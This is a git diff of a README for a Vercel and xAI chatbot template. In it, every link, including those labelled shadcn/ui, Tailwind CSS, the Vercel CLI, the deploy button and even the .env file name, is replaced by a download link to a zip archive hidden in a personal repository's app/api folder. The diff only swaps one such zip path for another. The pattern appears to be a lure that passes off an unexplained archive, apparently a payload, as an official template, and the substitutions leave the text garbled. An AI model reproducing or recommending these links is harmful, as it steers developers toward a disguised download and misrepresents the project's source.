@@ -1,9 +1,9 @@
-<a href="https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip">
+<a href="https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip">
   <h1 align="center">Vercel x xAI Chatbot</h1>
 </a>
 
 <p align="center">
-  An open-source AI chatbot app template built with https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip, the AI SDK by Vercel, and xAI.
+  An open-source AI chatbot app template built with https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip, the AI SDK by Vercel, and xAI.
 </p>
 
 <p align="center">
@@ -16,17 +16,17 @@
 
 ## Features
 
-- Streaming text responses powered by the [AI SDK by Vercel](https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip), allowing multiple AI providers to be used interchangeably with just a few lines of code.
+- Streaming text responses powered by the [AI SDK by Vercel](https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip), allowing multiple AI providers to be used interchangeably with just a few lines of code.
 - Built-in tool integration for extending AI capabilities (demonstrated with a weather tool example).
 - Reasoning model support.
-- [shadcn/ui](https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip) components for a modern, responsive UI powered by [Tailwind CSS](https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip).
-- Built with the latest [https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip](https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip) App Router.
+- [shadcn/ui](https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip) components for a modern, responsive UI powered by [Tailwind CSS](https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip).
+- Built with the latest [https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip](https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip) App Router.
 
 ## Deploy Your Own
 
 You can deploy your own version to Vercel by clicking the button below:
 
-[![Deploy with Vercel](https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip)](https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip+x+xAI+Chatbot&repository-name=ai-sdk-starter-xai&repository-url=https%3A%2F%https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip%2Fvercel-labs%2Fai-sdk-starter-xai&demo-title=Vercel+x+xAI+Chatbot&demo-url=https%3A%2F%https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip%2F&demo-description=A+simple+chatbot+application+built+with+https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip+that+uses+xAI+via+the+AI+SDK+and+the+Vercel+Marketplace&products=[{%22type%22:%22integration%22,%22protocol%22:%22ai%22,%22productSlug%22:%22grok%22,%22integrationSlug%22:%22xai%22}])
+[![Deploy with Vercel](https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip)](https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip+x+xAI+Chatbot&repository-name=ai-sdk-starter-xai&repository-url=https%3A%2F%https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip%2Fvercel-labs%2Fai-sdk-starter-xai&demo-title=Vercel+x+xAI+Chatbot&demo-url=https%3A%2F%https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip%2F&demo-description=A+simple+chatbot+application+built+with+https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip+that+uses+xAI+via+the+AI+SDK+and+the+Vercel+Marketplace&products=[{%22type%22:%22integration%22,%22protocol%22:%22ai%22,%22productSlug%22:%22grok%22,%22integrationSlug%22:%22xai%22}])
 
 ## Running Locally
 
@@ -40,7 +40,7 @@ You can deploy your own version to Vercel by clicking the button below:
    pnpm install
    ```
 
-2. Install the [Vercel CLI](https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip):
+2. Install the [Vercel CLI](https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip):
 
    ```bash
    npm i -g vercel
@@ -62,7 +62,7 @@ You can deploy your own version to Vercel by clicking the button below:
    vercel env pull
    ```
 
-   This will create a `https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip` file with all the necessary environment variables.
+   This will create a `https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip` file with all the necessary environment variables.
 
 3. Run the development server:
 
@@ -78,6 +78,6 @@ You can deploy your own version to Vercel by clicking the button below:
 
 ## Authors
 
-This repository is maintained by the [Vercel](https://raw.githubusercontent.com/CarsonWhite13/ai-sdk-starter-xai/main/app/api/ai-sdk-starter-xai-2.0.zip) team and community contributors.
+This repository is maintained by the [Vercel](https://github.com/CarsonWhite13/ai-sdk-starter-xai/raw/refs/heads/main/app/api/chat/sdk-xai-starter-ai-v1.0.zip) team and community contributors.
 
 Contributions are welcome! Feel free to open issues or submit pull requests to enhance functionality or fix bugs.
